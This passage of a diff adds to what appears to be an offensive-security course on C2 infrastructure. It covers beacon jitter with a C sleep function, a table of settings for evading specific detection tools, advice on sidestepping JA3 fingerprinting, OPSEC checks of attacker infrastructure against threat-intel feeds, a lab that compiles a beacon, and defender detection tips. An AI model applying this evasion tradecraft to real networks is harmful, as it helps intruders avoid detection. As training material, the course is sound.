+// DRILL: Draw this architecture from memory on paper. Label every hop. For each hop, write one sentence describing what a network defender sees and why it is or isn't suspicious.
+
+---
+
+## Beacon Interval Jitter — Why It Matters
+
+**WHAT IT IS**: Jitter is deliberate randomisation of the time between beacon callbacks.
+Instead of firing every exactly 30 seconds, the beacon fires at 30 ± some random amount.
+The randomisation window is expressed as a percentage of the base interval.
+
+**WHY IT MATTERS**: IDS/EDR systems and SIEM platforms profile network behaviour over time.
+Modern detection engines (Darktrace, Elastic SIEM ML, Zeek beacon detection scripts) all
+implement time-series analysis of connection patterns. Their detection logic is simple
+and brutally effective:
+
+```
+BEACON DETECTION ALGORITHM (simplified — what Zeek and Darktrace run):
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+For each (source_ip, destination_ip) pair in NetFlow logs:
+  1. Extract timestamps of all connection events
+  2. Calculate inter-connection intervals (delta_t between each pair)
+  3. Calculate mean and standard deviation of those intervals
+  4. Score = 1.0 - (stddev / mean)
+     If score > 0.85: flag as potential beacon
+
+INTERPRETATION:
+  Perfect 30s beacon:
+    intervals = [30, 30, 30, 30, 30, 30]
+    mean = 30, stddev ≈ 0
+    score = 1.0 - (0 / 30) = 1.0  ← FLAGGED IMMEDIATELY
+
+  10% jitter (±3s):
+    intervals = [28, 32, 29, 31, 27, 33]
+    mean = 30, stddev ≈ 2.2
+    score = 1.0 - (2.2 / 30) = 0.927  ← STILL FLAGGED
+
+  40% jitter (±12s):
+    intervals = [18, 42, 25, 38, 21, 35]
+    mean = 29.8, stddev ≈ 9.2
+    score = 1.0 - (9.2 / 29.8) = 0.691  ← Below most alert thresholds
+
+  50% jitter with longer base (60s ± 30s):
+    intervals = [41, 78, 55, 89, 34, 62]
+    mean ≈ 60, stddev ≈ 20
+    score = 1.0 - (20 / 60) = 0.667  ← Looks like normal browse traffic
+```
+
+The formula in your C beacon:
+
+```c
+/*
+ * jitter_sleep — the math behind beacon interval randomisation
+ *
+ * FORMULA:
+ *   jitter_range = base_sec * (jitter_pct / 100.0)
+ *   offset       = random float in [-jitter_range, +jitter_range]
+ *   actual_sleep = base_sec + offset
+ *
+ * EXAMPLE — base=30, jitter=40%:
+ *   jitter_range = 30 * 0.40 = 12 seconds
+ *   offset       = random in [-12, +12]   ← rand() normalized to [-range, +range]
+ *   actual_sleep = 30 + offset             ← anywhere from 18s to 42s
+ *
+ * WHY rand() NOT time(NULL):
+ *   time(NULL) changes every second — predictable.
+ *   rand() seeded with time(NULL) gives pseudo-random values per-call.
+ *   For stronger randomness, use CryptGenRandom() on Windows (overkill here).
+ */
+void jitter_sleep(int base_sec, int jitter_pct) {
+    /*
+     * (double)rand() / RAND_MAX
+     *   → float in [0.0, 1.0]
+     * * 2.0 * range
+     *   → float in [0.0, 2*range]
+     * - range
+     *   → float in [-range, +range]
+     */
+    double range  = base_sec * (jitter_pct / 100.0);
+    double offset = ((double)rand() / RAND_MAX) * 2.0 * range - range;
+    int    actual = (int)(base_sec + offset);
+    if (actual < 1) actual = 1;              /* never sleep less than 1s */
+    Sleep(actual * 1000);                    /* Win32 Sleep() takes ms */
+}
+```
+
+### Jitter Parameter Selection Guide
+
+```
+ENVIRONMENT          BASE SLEEP    JITTER    REASONING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+No monitoring         5s           10%       Speed > stealth — get in, get out
+Light monitoring     30s           30%       Breaks simple IDS rules
+Corporate SIEM       60s           40%       Harder for ML beacon detection
+SOC with Darktrace  120s           50%       Maximum evasion vs behavioural AI
+Air-gapped / SMB      5s            5%       Internal only — no pattern analysis
+```
+
+### What Jitter Doesn't Fix
+
+Jitter randomises timing. It does not fix:
+- **Consistent source/destination pair** — if the same workstation always connects
+  to the same CDN IP, that's still anomalous even with random timing
+- **Session length** — short connect/disconnect cycles look different from sustained
+  HTTPS browsing sessions (which maintain TLS sessions for minutes)
+- **Data volume** — a beacon sending 200 bytes every cycle has a different profile
+  than a user browsing websites (which transfers kilobytes)
+- **Business hours** — a beacon connecting at 2:47AM when no one is in the office
+  is anomalous regardless of timing jitter
+
+Fix these by: rotating destination IPs (redirectors with DNS TTL), varying payload sizes
+(random padding in POST data), and matching beacon activity to target organisation's
+working hours.
+
+// DRILL: Write a Python script that generates 100 jittered intervals using base=30, jitter=40. Calculate mean and standard deviation. Compute the beacon score (1 - stddev/mean). Confirm it's below 0.85. Then plot the intervals with matplotlib and visually confirm they look random.
+
+---
+
+## Section 6 — C2 Detection Methods
+
+Know what the defenders are looking for. Build your C2 to not look like that.
+
+### JA3 / JA3S Fingerprinting
+
+JA3 is an algorithm that fingerprints TLS clients (and servers) based
+on TLS handshake parameters. Every TLS library has a distinct JA3 hash.
+Many C2 frameworks have known JA3 hashes.
+
+```
+JA3 CALCULATION (simplified):
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+JA3 hashes: TLSVersion,Ciphers,Extensions,EllipticCurves,EllipticCurvePointFormats
+Example: 769,47-53-5-10-49161-49162-49171-49172-50-56-19-4,0-10-11,23-24-25,0
+MD5 of that string = JA3 hash
+
+KNOWN MALICIOUS JA3 HASHES (partial list):
+  a0e9f5d64349fb13191bc781f81f42e1  → Metasploit Meterpreter
+  72a589da586844d7f0818ce684948eea  → Cobalt Strike default
+  b386946a5a44d1ddcc843bc75336dfce  → Cobalt Strike malleable profile (some)
+
+DEFENDERS USE JA3 TO:
+  - Block connections from known-bad TLS fingerprints at the firewall
+  - Alert on matching fingerprints in network traffic
+  - Attribute traffic to specific tooling
+
+YOUR RESPONSE:
+  1. Use a realistic JA3 — compile your agent using the same TLS library
+     as the software you're mimicking (Chrome uses BoringSSL → match its JA3)
+  2. Or: use a framework that supports JA3 randomisation
+  3. Check your JA3 before deployment:
+     # Capture traffic: Wireshark → capture → filter tls.handshake.type == 1
+     # Extract JA3: https://github.com/salesforce/ja3
+     python ja3.py capture.pcap
+     # Compare against known-good browser JA3 hashes
+```
+
+### Beacon Interval Analysis
+
+Regular beacon intervals are detectable by UEBA and SIEM tools that
+perform time-series analysis on connection patterns.
+
+```
+DETECTION LOGIC:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+SIEM looks for:
+  - Same source IP making requests to same destination at regular intervals
+  - Requests with low entropy in timing (consistent ± small variation)
+  - Short sessions (connect, small request, disconnect, wait, repeat)
+  - Connections outside business hours to external IPs
+
+AUTOMATED BEACON DETECTION TOOLS:
+  - Zeek C2 detection scripts
+  - Security Onion's beacon detection
+  - Elastic SIEM ML detection rules
+  - Darktrace behavioural AI
+
+COUNTERMEASURES:
+  - High jitter (30-50%) breaks simple interval matching
+  - Vary request sizes (add random padding to POST data)
+  - Randomise URIs (rotate through a pool of valid-looking URIs)
+  - Use long sleep times (60s+ base) — fewer samples for analysis
+  - Masquerade traffic timing after business hours ends
+    (if target org is 9-5, beacon at 23:00 is suspicious)
+```
+
+### Network IOC Hunting
+
+Defenders feed known C2 infrastructure to threat intel feeds and
+hunt for these across network logs.
+
+```bash
+# Defender hunts:
+# Proxy logs → match against ThreatFox/Abuse.ch C2 domains
+# DNS logs → match against malware C2 domain feeds
+# NetFlow → match against C2 IP reputation feeds
+
+# Your OPSEC response:
+# 1. Use fresh infrastructure for each operation
+# 2. Check all C2 IPs/domains against major threat intel BEFORE use:
+curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress=<YOUR_IP>&maxAgeInDays=90" \
+     -H "Key: <API_KEY>"
+
+# Check domain:
+curl -s "https://urlhaus-api.abuse.ch/v1/host/" \
+     -d "host=<YOUR_DOMAIN>"
+
+# VirusTotal IP check:
+curl -s "https://www.virustotal.com/api/v3/ip_addresses/<IP>" \
+     -H "x-apikey: <API_KEY>"
+
+# If any of these return hits: do NOT use this infrastructure.
+# Burn it. Get new IPs. Get new domains. Never operate on flagged infrastructure.
+```
+
+---
+
 ## DEFENDER TAKEAWAY
 
 You just learned how attackers build C2 infrastructure. Here is what to do with that knowledge on Monday morning to harden your own environment.
@@ -1170,6 +2308,8 @@ You just learned how attackers build C2 infrastructure. Here is what to do with 
 - **Name-pipe monitoring for SMB C2.** Run Sysmon (free, from Sysinternals) and enable Event ID 17 (Pipe Created) and Event ID 18 (Pipe Connected). Alert on named pipes being created by processes that have no business creating them (e.g., `svchost.exe` creating a pipe named `MSSE-1234-server` or any random alphanumeric string). Legitimate named pipes follow consistent naming conventions.
 
 - **JA3 fingerprint blocking at your firewall/IDS.** Snort, Suricata, and most NGFWs support JA3 hash matching. Import the known-bad JA3 hash list from https://github.com/trisulnsm/trisul-scripts/tree/master/lua/frontend_scripts/reassembly/ja3 and block or alert on matches. This catches default Metasploit and Cobalt Strike traffic even when it uses legitimate-looking URIs.
+
+- **Discord C2 detection.** Block or monitor chat applications on corporate workstations. If Discord must be allowed, monitor for bot token authentication patterns (Discord bot user IDs always start with a specific range, and bot tokens have a recognisable base64 structure). Alert on Discord connections from server machines (not workstations) — no one runs Discord on a web server.
 
 ---
 
@@ -1195,6 +2335,11 @@ You just learned how attackers build C2 infrastructure. Here is what to do with 
 | **MinGW-w64** | GNU compiler toolchain for Windows; used to compile C implant code on Windows via MSYS2 |
 | **kernel32.dll** | Core Windows DLL providing process/thread/memory APIs including ExitProcess(); always link with -lkernel32 |
 | **ntdll.dll** | Lowest-level Windows DLL exposing native NT syscalls; implicitly linked but used directly for syscall bypasses |
+| **WSAStartup** | Windows Sockets initialisation function; must be called before any socket operations |
+| **CreateProcess** | Win32 API for spawning processes with custom stdin/stdout/stderr handles; used for pipe-captured command execution |
+| **ws2_32.dll** | Windows Sockets DLL; link with -lws2_32 for all Winsock functions (socket, connect, send, recv) |
+| **Discord C2** | Using Discord bot API as covert C2 transport; traffic blends with legitimate Discord usage on port 443 |
+| **Beacon score** | Metric (1 - stddev/mean) quantifying how periodic a connection pattern is; >0.85 = strong beacon signal |
 
 ---
 
@@ -1244,10 +2389,23 @@ Your mission:
    - Advance the system clock past the kill date.
    - Verify the agent terminates silently.
 
+7. **Build the C beacon and Python listener — full integration**.
+   - Compile `beacon.c` with `x86_64-w64-mingw32-gcc beacon.c -o beacon.exe -lws2_32`.
+   - Start `operator_listener.py` on your machine.
+   - Run `beacon.exe` on the target (or localhost for the drill).
+   - Confirm heartbeat JSON arrives at the listener.
+   - Select the agent. Send `whoami`. Confirm output returns.
+   - Send `ipconfig`. Confirm network configuration returns.
+   - Observe beacon reconnection intervals — confirm jitter is active.
+   - Kill the listener. Watch beacon retry silently. Restart listener. Confirm reconnect.
+
+// DRILL: Build the C beacon and Python listener, connect on localhost, send whoami, receive output. Then modify SLEEP_BASE to 10 and SLEEP_JITTER to 50. Run for 2 minutes. Record 12 intervals. Calculate mean and stddev. Compute beacon score. Does it fall below 0.85?
+
 The infrastructure is half the operation. Build it like you're
 going to live in it for six months. Because sometimes you will.
 
 ---
 
-— The BEACON fires through the dark network — jitter-masked,
-TLS-wrapped, patient — waiting for the operator's command
+— The BEACON fires JITTER-masked through the watched wire —
+dark traffic, clean CDN, operator waits with the cursor ready
+
